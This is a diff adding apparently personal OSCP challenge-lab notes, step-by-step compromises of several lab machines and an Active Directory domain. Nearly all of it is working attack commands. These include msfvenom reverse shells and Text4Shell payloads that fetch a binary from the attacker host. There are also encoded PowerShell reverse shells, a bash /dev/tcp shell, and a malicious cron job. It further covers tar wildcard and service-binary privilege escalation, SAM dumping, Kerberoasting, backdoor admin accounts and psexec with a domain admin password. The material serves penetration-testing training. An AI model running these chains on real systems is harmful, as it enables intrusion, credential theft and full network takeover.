@@ -2525,3 +2525,838 @@ start
 
 ```
 
+**OSCP-B**
+
+```
+sudo nmap -sS -Pn -p- 192.168.216.149 | tee 149/149_open_port_scan.txt
+
+sudo nmap -sV -sC -p 21,22,80 -Pn 192.168.216.149 | tee 149/149_script_scan.txt
+
+sudo nmap -sU --top-ports 25 192.168.216.149 | tee 149/149_udp_top_25_scan.txt
+
+sudo nmap -sU -sV -sC -p 161 192.168.216.149 | tee 149/149_snmp_script_scan.txt
+
+sudo nmap -sU --script=snmp-brute 192.168.216.149
+
+snmpwalk -v 1 -c public 192.168.216.149 | tee 149/149_snmp_public_string_scan.txt
+
+snmpwalk -v 1 -c public 192.168.216.149 .1 | tee 149/149_full_snmpwalk_scan.txt
+
+interesting output from that full scan:			kiero and john are identified as valid users
+
+onesixtyone -c communities.txt -i ip.txt
+
+				- https://github.com/danielmiessler/SecLists/blob/master/Discovery/SNMP/snmp.txt
+
+ftp 192.168.216.149
+
+		- kiero : kiero
+
+get id_rsa
+
+get id_rsa_2
+
+get id_rsa.pub
+
+vim id_rsa.pub 							→ these are john's keys
+
+chmod 0400 id_rsa
+
+ssh -i id_rsa john@192.168.216.149
+
+whoami && cat local.txt && ifconfig
+
+find / -type f -perm -u=s 2>/dev/null
+
+ls -al /home/john/RESET_PASSWD
+
+strings /home/john/RESET_PASSWD && su kiero							--> kiero is the password
+
+wget -O pspy64 http://192.168.45.213:443/pspy64
+
+sudo python3 -m http.server 443
+
+./pspy64
+
+wget -O linpeas.sh http://192.168.45.213:443/linpeas.sh
+
+sudo python3 -m http.server 443
+
+chmod +x linpeas.sh
+
+./linpeas.sh | tee JOHN_LINPEAS_149.txt
+
+python3 -m pyftpdlib -p 21 --write
+
+ftp 192.168.45.213												(anonymous : “”)
+
+put JOHN_LINPEAS_149.txt
+
+strace /home/john/RESET_PASSWD 2>&1 | grep -i -E "open|access|no such file"
+
+strings RESET_PASSWD | grep kiero													--> echo and chpasswd are both executed as relative paths
+
+msfvenom -p linux/x64/shell_reverse_tcp -f elf LHOST=tun0 LPORT=80 -o chpasswd
+
+sudo systemctl start ssh
+
+scp kali@192.168.45.213:/home/kali/ChallengeLabs/OSCP_B/chpasswd ./chpasswd
+
+cp chpasswd echo
+
+chmod +x chpasswd
+
+chmod +x echo
+
+export PATH=$PWD:$PATH
+
+echo $PATH
+
+./RESET_PASSWD
+
+nc -nvlp 80
+
+whoami && cat /root/proof.txt && ifconfig
+
+python3 -c ‘import pty; pty.spawn("/bin/bash");’
+
+whoami && cat /root/proof.txt && ifconfig
+
+	- full snmp walk using public reveals john reset kiero's password to the default
+
+	- kiero : kiero on ftp reveals private SSH keys for john
+
+	- RESET_PASSWD suid binary executes echo/chpasswd commands with relative paths
+
+	- malicious chpasswd/echo binaries are placed in /home/john and /home/john is added to PATH
+
+	- the SUID binary is executed with the modified path and a shell is caught
+
+OSCP B - 192.168.199.150 - Berlin
+
+sudo nmap -sS -Pn -p- 192.168.199.150 | tee 150/150_open_port_scan.txt
+
+sudo nmap -sV -sC -p 22,8080 -Pn 192.168.199.150 | tee 150/150_script_scan.txt
+
+gobuster dir -u "http://192.168.199.150:8080/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+http://192.168.199.150:8080/search
+
+http://192.168.199.150:8080/search?query=test
+
+http://192.168.199.150:8080/CHANGELOG
+
+Apache Commons Text 1.8 exploit
+
+https://medium.com/mii-cybersec/cve-2022-42889-text4shell-vulnerability-17b703a48dcd
+
+msfvenom -p linux/x64/shell_reverse_tcp -f elf LHOST=tun0 LPORT=80 -o revshell.elf
+
+python3 -m http.server 80
+
+nc -nvlp 80
+
+${script:javascript:java.lang.Runtime.getRuntime().exec('curl -o /tmp/revshell.elf 192.168.45.213/revshell.elf')}%
+
+%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27curl%20-o%20%2Ftmp%2Frevshell.elf%20192.168.45.213%2Frevshell.elf%27%29%7D%25
+
+command: curl http://192.168.199.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27curl%20-o%20%2Ftmp%2Frevshell.elf%20192.168.45.213%2Frevshell.elf%27%29%7D%25 
+
+${script:javascript:java.lang.Runtime.getRuntime().exec('chmod 777 /tmp/revshell.elf')}%
+
+%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27chmod%20777%20%2Ftmp%2Frevshell.elf%27%29%7D%25
+
+command: curl "http://192.168.199.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27chmod%20777%20%2Ftmp%2Frevshell.elf%27%29%7D%25
+
+${script:javascript:java.lang.Runtime.getRuntime().exec('/tmp/revshell.elf')}%
+
+%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27%2Ftmp%2Frevshell.elf%27%29%7D%25
+
+command: curl "http://192.168.199.150:8080/search?query=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime%28%29.exec%28%27%2Ftmp%2Frevshell.elf%27%29%7D%25
+
+python3 -c 'import pty; pty.spawn("/bin/bash");'
+
+[in the /home/dev/ directory]
+
+whoami && cat local.txt && ifconfig
+
+ssh-keygen
+
+cd ~
+
+mkdir .ssh
+
+echo “ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOzFpsomzI+v6wYzCH+XvAtjsmMPeTSQZ7OhPwMRuc9j kali@kali” >> .ssh/authorized_keys
+
+ssh -i secret dev@192.168.199.150
+
+netstat -tunlp
+
+sudo systemctl start ssh
+
+ssh -N -R 127.0.0.1:8000:127.0.0.1:8000 kali@192.168.45.213
+
+sudo nmap -sV -sC -p 8000 127.0.0.1
+
+“exploiting jdwp”
+
+[https://github.com/hugsy/jdwp-shellifier]
+
+git clone https://github.com/hugsy/jdwp-shellifier.git
+
+ps -e -F | grep java
+
+cat /opt/stats/App.java
+
+./jdwp-shellifier.py --target 127.0.0.1 -p 8000 -c "/tmp/revshell.elf"
+
+nc -nvlp 80
+
+whoami && cat /root/proof.txt && ifconfig
+
+exploit chain: 
+
+	- RCE via apache commons text 1.8 (curl payload, chmod payload, execute payload, all on port 80)
+
+	- jdwp debugging App.java on port 5000 via 127.0.0.1:8000
+
+	- ./jdwp-shellifier.py used to run the previously used payload
+
+	- netcat connect to port 5000
+
+	- catch root shell
+
+	OSCP B - 192.168.199.151 - Gust
+
+sudo nmap -sS -Pn -p- 192.168.199.151 | tee 151/151_open_port_scan.txt
+
+sudo nmap -sV -sC -Pn -p 80,3389,7680,8021 192.168.199.151 | tee 151/151_script_scan.txt
+
+nc -nv 192.168.199.151 8021
+
+Googling “exploiting cluecon”
+
+exploit-db 4799
+
+python3 exploit.py
+
+python3 exploit.py 192.168.199.151 dir
+
+psencode 192.168.45.213 80
+
+python3 exploit.py 192.168.199.151 “powershell.exe -ep bypass -w hidden -NoP -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAzACIALAA4ADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA”
+
+nc -nvlp 80
+
+whoami; type local.txt; ipconfig
+
+whoami /priv
+
+sudo python3 -m http.server 80
+
+iwr -uri http://192.168.45.213:80/GodPotato.exe -o GodPotato.exe
+
+msfvenom -p windows/x64/shell_reverse_tcp -f exe LHOST=tun0 LPORT=80 -o revshell.exe
+
+iwr -uri http://192.168.45.213/revshell.exe -o revshell.exe
+
+python3 -m http.server 80
+
+cmd.exe /c START /B .\revshell.exe
+
+nc -nvlp 80
+
+dir "C:\Program Files"
+
+Google “privilege escalation via Kite”
+
+wmic service get name, displayname, pathname, startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """
+
+sc qc "KiteService"
+
+sc stop KiteService
+
+copy .\revshell.exe "C:\program files\Kite\KiteService.exe"														(the service binary is replaced instead of abusing the unquoted service path because the C:\ directory is not writable to the low level user)
+
+sc start KiteService
+
+nc -nvlp 80
+
+whoami
+
+whoami & type C:\Users\Administrator\Desktop\proof.txt & ipconfig
+
+	- RCE via FreeSWITCH on port 8021
+
+	- stable shell access via msfvenom payload
+
+	- privilege escalation by replacing KiteService binary with msfvenom payload and restarting KiteService
+
+OSCP B - Domain
+
+sudo nmap -sS -Pn -p- 192.168.199.147 | tee domain/147/147_open_port_scan.txt
+
+sudo masscan -p1-65535,U:1-65535 192.168.199.147 --rate=1000 -e tun0 | tee 147/147_masscan_open_ports.txt
+
+sudo nmap -sV -sC -Pn -p 21,22,135,139,445,5040,5985,8000,8080,8443,47001,49664,49665,49666,49667,49668,49669,49670,49671 192.168.199.147 | tee 147/147_script_scan.txt
+
+sudo vim /etc/hosts
+
+sudo nmap -sU --top-ports 25 192.168.199.147 | tee 147/147_top_25_udp_scan.txt
+
+sudo nmap -A -Pn -p 21,22,135,139,445,5040,5985,8000,8080,8443,47001,49664,49665,49666,49667,49668,49669,49670,49671 192.168.199.147					--> shows that 8080 is a partner portal
+
+browse to “http://ms01.oscp.exam:8080/”												--> 192.168.199.147 MUST be registered as MS01.oscp.exam in /etc/hosts
+
+python3 -m http.server 80
+
+submitting “http://192.168.45.213/here.txt”
+
+[shows that the application makes a request to whichever url is put down]
+
+sudo impacket-smbserver -smb2support share .
+
+submitting to “\\192.168.45.213\share”
+
+hashcat -m 5600 web_svc.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+[web_svc's password is cracked to reveal Diamond1]
+
+crackmapexec smb 192.168.199.147 -u web_svc -p Diamond1
+
+ftp 192.168.199.147															 (web_svc : Diamond1)
+
+ssh web_svc@192.168.199.147													 (web_svc : Diamond1)
+
+sudo systemctl start ssh
+
+ssh -N -R 9999 kali@192.168.45.213
+
+sudo vim /etc/proxychains4.conf
+
+proxychains -q crackmapexec smb domain_machines.txt -u web_svc -p Diamond1 --users | tee domain_users.txt
+
+proxychains -q crackmapexec smb domain_machines.txt -u web_svc -p Diamond1 --groups | tee domain_groups.txt
+
+proxychains -q bloodhound-python -c All -u web_svc -p Diamond1 -d oscp.exam -ns 10.10.159.146 --dns-tcp
+
+sudo neo4j start
+
+bloodhound&
+
+proxychains -q impacket-GetUserSPNs -request -dc-ip 10.10.159.146 oscp.exam/web_svc:Diamond1
+
+hashcat -m 13100 cracking/hashes.kerber /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+
+proxychains -q impacket-mssqlclient sql_svc:Dolphin1@10.10.159.148 -windows-auth
+
+ipconfig (on MS01)
+
+enable_xp_cmdshell
+
+EXECUTE xp_cmdshell 'whoami';
+
+EXECUTE xp_cmdshell 'ping 10.10.159.147';
+
+psencode 10.10.159.147 443
+
+powershell.exe
+
+iwr -uri http://192.168.45.213/nc64.exe -o nc64.exe
+
+dir
+
+python3 -m http.server 80
+
+.\nc64.exe -nvlp 443
+
+EXECUTE xp_cmdshell ‘powershell.exe -ep bypass -w hidden -NoP -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1ADkALgAxADQANwAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+
+’;
+
+.\nc64.exe -nvlp 443
+
+whoami /priv
+
+[Setting up ligolo-ng to facilitate connections from MS02 to the attacker]
+
+1. Download the linux amd64 proxy server and windows amd64 agent to the attacker
+
+   1) “https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_proxy_0.7.2-alpha_linux_amd64.tar.gz”
+
+   2) https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.2-alpha/ligolo-ng_agent_0.7.2-alpha_windows_amd64.zip
+
+2. configure the interface on kali
+
+   1) sudo ip tuntap add user kali mode tun ligolo
+
+   2) sudo ip link set ligolo up
+
+3. run the ligolo-ng proxy server on the attacker
+
+   1) ./proxy -selfcert
+
+4. serve the agent.exe to MS01 via http webserver
+
+   1) python3 -m http.server 80
+
+5. Download and run the Windows agent.exe to MS01
+
+   1) iwr -uri http://192.168.45.213/agent.exe -o agent.exe
+
+   2) .\agent.exe -connect 192.168.45.213:11601 -ignore-cert
+
+6. receive and join the session with MS01
+
+   1) session
+
+      1- 1
+
+   2) ifconfig
+
+   1) sudo ip route add 10.10.159.0/24 dev ligolo
+
+   1)  start
+
+   2) listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:80
+
+   3) listener_add --addr 0.0.0.0:1235 --to 127.0.0.1:443
+
+iwr -uri http://10.10.159.147:1234/GodPotato.exe -o GodPotato.exe
+
+python3 -m http.server 80
+
+psencode 192.168.159.147 1235
+
+.\GodPotato.exe -cmd “powershell.exe -ep bypass -w hidden -NoP -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1ADkALgAxADQANwAiACwAMQAyADMANQApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=”
+
+nc -nvlp 443
+
+reg save hklm\sam c:\sam
+
+reg save hklm\system c:\system
+
+reg save hklm\security c:\security
+
+listener_add --addr 0.0.0.0:1237 --to 127.0.0.1:22
+
+listener_add --addr 0.0.0.0:1238 --to 127.0.0.1:445
+
+iwr -uri http://10.10.159.147:1234/mimikatz.exe -o mimikatz.exe
+
+msfvenom -p windows/x64/shell_reverse_tcp -f exe LHOST=10.10.159.147 LPORT=1235 -o revshell.exe
+
+iwr -uri http://10.10.159.147:1234/revshell.exe -o revshell.exe
+
+python3 -m http.server 80
+
+.\revshell.exe
+
+nc -nvlp 443
+
+net user /add added_user Password1# 
+
+net localgroup administrators added_user /add
+
+net localgroup "Remote Desktop Users" added_user /add
+
+Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+
+Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" -Name "UserAuthentication" -Value 1
+
+proxychains -q nxc rdp 10.10.159.148 -u added_user -p Password1# --local-auth
+
+proxychains -q xfreerdp /u:added_user /p:Password1# /v:10.10.159.148
+
+net localgroup "remote management users" added_user /add
+
+proxychains -q evil-winrm -i 10.10.159.148 -u added_user -p Password1#
+
+impacket-secretsdump -sam sam -system system -security security local															--> The plaintext domain admin password is revealed to be: 7Tg9M9MZbzAokR9
+
+proxychains -q crackmapexec smb domain_machines.txt -u Administrator -p "7Tg9M9MZbzAokR9"
+
+proxychains -q impacket-psexec Administrator:7Tg9M9MZbzAokR9@10.10.159.146
+
+```
+
+
+**OSCP-C**
+
+```
+192.168.215.156		- 		Frankfurt		-		OSCP C
+
+sudo nmap -sS -Pn -p- 192.168.215.156 | tee 156/156_open_port_scan.txt
+
+sudo masscan -p1-65535,U:1-65535 192.168.215.156 --rate=1000 -e tun0 | tee 156/156_masscan_open_ports.txt
+
+sudo nmap -A -Pn -p 21,22,25,53,80,110,143,465,587,993,995,2525,3306,8080,8083,8443 192.168.215.156 | tee 156/156_script_scan.txt
+
+sudo nmap -sU -sV -sC -p 161 192.168.215.156 | tee 156/156_nmap_script_scan_161.txt
+
+snmpwalk -v 1 -c public 192.168.215.156 .1 | tee 156/156_full_snmpwalk_public.txt					--> this is the full SNMP scan
+
+ssh Jack@192.168.215.156
+
+ftp 192.168.215.156 																→ Jack : 3PUKsX98BMupBiCf
+
+[logging in at https://192.168.215.156:8083/login]
+
+[Google search “vesta authenticated”]
+
+[any authenticated admin user can arbitrarily create cron jobs]
+
+msfvenom -p linux/x64/shell_reverse_tcp -f elf LHOST=192.168.45.213 LPORT=80 -o revshell.elf
+
+[exploitation instructions from https://gitlab.com/-/snippets/1954764]
+
+1. browse to https://192.168.215.156:8083/add/cron as the authenticated Jack user
+
+2. add the cronjob wget -O ./revshell.elf http://192.168.45.213:443/revshell.elf && chmod +x ./revshell.elf && ./revshell.elf to run every minute
+
+3. serve the payload and have the listener ready
+
+python3 -m http.server 443
+
+nc -nvlp 80
+
+python3 -c 'import pty; pty.spawn("/bin/bash");'
+
+whoami && cat /home/Jack/local.txt && ifconfig
+
+netstat -tunlp | grep 127.0.0.1
+
+wget -O pspy64 http://192.168.45.213:443/pspy64
+
+chmod +x pspy64
+
+./pspy64
+
+sudo systemctl start ssh
+
+curl http://192.168.45.213:443/linpeas.sh | sh | tee JACK_LINPEAS_156.txt
+
+python3 -m http.server 443
+
+[identifying high value targets]
+
+uname -a
+
+[Googling "4.15 kernel linux exploit"]
+
+[downloading https://github.com/scheatkode/CVE-2018-18955/releases/download/v0.0.1/linux-x86_64.zip from https://github.com/scheatkode/CVE-2018-18955/releases/tag/v0.0.1]
+
+python3 -m http.server 443
+
+wget -O archive.zip http://192.168.45.213:443/linux-x86_64.zip
+
+unzip archive.zip
+
+ls -al
+
+cd linux-x86_64
+
+chmod +x exploit.cron.sh
+
+./exploit.cron.sh
+
+whoami && cat /root/proof.txt && ifconfig
+
+	- Jack credentials are discovered by doing a full (.1) snmp scan with public string
+
+	- RCE is obtained by added as cron job reverse shell as Jack in the Vesta admin panel
+
+	- privilege escalation is done via linux kernel 4.15 cron job exploit
+
+192.168.215.157		-		Charlie		-		OSCP C
+
+sudo nmap -sS -Pn -p- 192.168.215.157 | tee 157/157_open_port_scan.txt
+
+sudo nmap -A -Pn -p 21,22,80,20000 192.168.215.157 | tee 157/157_aggressive_scan.txt
+
+ftp 192.168.215.157														--> anonymous : “”
+
+cd backup
+
+prompt OFF
+
+mget *
+
+[Googling “MiniServ 1.820” as per the output of the script scan]
+
+exiftool -a -u FUNCTION-TEMPLATE.pdf
+
+exiftool -a -u NEWSLETTER-TEMPLATE.pdf
+
+exiftool -a -u REPORT-TEMPLATE.pdf
+
+[browsing to http://192.168.215.157:20000/]
+
+[adding "192.168.215.157 oscp" to /etc/hosts]
+
+ftp 192.168.215.157											--> cassie : cassie
+
+[login to MiniServ at https://oscp:20000/ as cassie : cassie]
+
+Usermin tab > login > command shell > “bash -i >& /dev/tcp/192.168.45.213/80 0>&1”
+
+nc -nvlp 80
+
+whoami && cat local.txt && ifconfig
+
+ python3 -c 'import pty; pty.spawn("/bin/bash");'
+
+ls -al /etc/cron.*
+
+cat /etc/cron.d/2minutes
+
+cd /opt/
+
+cd admin
+
+touch /opt/admin/--checkpoint=1
+
+echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash;' > exploit.sh
+
+echo "" > '--checkpoint-action=exec=sh exploit.sh'
+
+[wait for 2 minutes for the root cron job to execute]
+
+ls -al /tmp/
+
+/tmp/bash -p
+
+whoami
+
+whoami && cat /root/proof.txt && ifconfig
+
+	- anonymous ftp reveals PDFs
+
+	- PDF metadata reveal Cassie user (among others)
+
+	- ftp as cassie : cassie is valid
+
+	- https://oscp:20000/ as cassie : cassie is vallid
+
+	- usermin > login > command shell > reverse bash shell
+
+	- root tar cronjob every 2 minutes with wild card
+
+	- go to /opt/admin and create malicious shell script as well as 2 files named as the appropriate command line switches for tar to execute a program
+
+	- wait for the root cron job to execute
+
+192.168.246.155		-		Pascha		- 		OSCP C
+
+sudo nmap -sS -Pn -p- 192.168.246.155 | tee 155/155_open_ports.txt
+
+sudo nmap -A -Pn -p 80,9099,9999,35913 192.168.246.155 | tee 155/155_script_scan.txt
+
+searchsploit Mobile Mouse
+
+searchsploit -m windows/remote/51010.py
+
+[the following modifications were made to the exploit]
+
+1. line 42 and 41 were joined
+
+2. line 43 and 44 were joined
+
+3. line 57 and 56 were joined
+
+4. lines 41 and 54 were modified to store and execute the file from a writable location on the victim's file system (c:\\\\Windows\\\\Temp\\\\{command_shell} instead of c:\Windows\Temp\{command_shell})
+
+   1) this is also because the ‘\’ were not properly escaped in the code
+
+5. nc64.exe is the payload that was grabbed and then it is run with command line arguments
+
+[the modified exploit code is the following]
+
+python3 51010.py --target 192.168.246.155 --file nc64.exe --lhost 192.168.45.213
+
+python3 -m http.server 8080																			→ as per the exploit code's hardcoded lport number
+
+nc -nvlp 80
+
+whoami
+
+whoami & type C:\Users\Tim\Desktop\local.txt & ipconfig
+
+cd C:\
+
+dir “C:\Program Files\”
+
+[Googling “privilege escalation MilleGPG5”]
+
+[clicking the packetstorm link]
+
+[low-level users can write to the “C:\Program Files\MilleGPG5\GPGService.exe” service binary that runs with NT AUTHORITY\SYSTEM privileges]
+
+[PoC instructions on packetstorm]
+
+cd "C:\Program Files\MilleGPG5"
+
+sc qc GPGOrchestrator
+
+icacls "C:\Program Files\MilleGPG5\GPGService.exe"
+
+msfvenom -p windows/x64/shell_reverse_tcp -f exe LHOST=192.168.45.213 LPORT=80 -o GPGService.exe
+
+sc stop GPGOrchestrator
+
+certutil -f -urlcache http://192.168.45.213:443/GPGService.exe GPGService.exe
+
+python3 -m http.server 443
+
+shutdown /r
+
+nc -nvlp 80
+
+whoami & type C:\Users\Administrator\Desktop\proof.txt & ipconfig
+
+	1. modified rce exploit for mobile mouse server on port 9099 to grab and execute payload
+
+	2. privilege escalation via user installed MilleGPG5 service binary replacement
+
+	3. restart the machine with a listener waiting and the service binary replaced for a SYSTEM shell
+
+domain		 -		 OSCP C
+
+MS01
+
+sudo masscan -p1-65535,U:1-65535 192.168.246.153 --rate=1000 -e tun0 | tee MS01/MS01_masscan_open_ports.txt
+
+sudo nmap -A -Pn -p 22,135,139,445,5040,5985,8000,47001,49664,49665,49667,49668,49669,49670,49671 192.168.246.153 | tee MS01/MS01_agressive_scan.txt
+
+echo “192.168.146.153” >> /etc/hosts
+
+feroxbuster -u "http://192.168.246.153:8000/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --filter-status 400,404
+
+[browsing to http://192.168.246.153:8000/partner/db leads to a sqlite file download named ‘db’]
+
+sqlitebrowser db
+
+	Browse Data > table = partners
+
+[browsing to https://crackstation.net/ , pasting the password in the box and filling out the captcha reveals the passwords to be “Freedom1” and “ecorp” for ecorp and support respectively]
+
+crackmapexec smb 192.168.246.153 -u support -p "Freedom1" --local-auth
+
+ssh support@192.168.246.153 														→ support : Freedom1
+
+sudo systemctl start ssh
+
+ssh -N -R 9999 kali@192.168.45.213
+
+sudo vim /etc/proxychains4.conf
+
+[setting up ligolo-ng for pivoting into 10.XX]                                                 (https://github.com/nicocha30/ligolo-ng/wiki/Quickstart)
+
+1. sudo ip tuntap add user kali mode tun ligolo
+
+2. sudo ip link set ligolo up
+
+3. python3 -m http.server 80
+
+4. certutil -f -urlcache http://192.168.45.213/agent.exe agent.exe
+
+5. START /B agent.exe -connect 192.168.45.213:11601 -ignore-cert
+
+6. session 1
+
+7. ifconfig
+
+8. sudo ip route add 10.10.206.0/24 dev ligolo
+
+9. start
+
+10. crackmapexec smb 10.10.206.0/24 -u "" -p ""                   (to confirm connectivity)
+
+sudo nmap -v -sS -p- --open -Pn 10.10.206.152
+
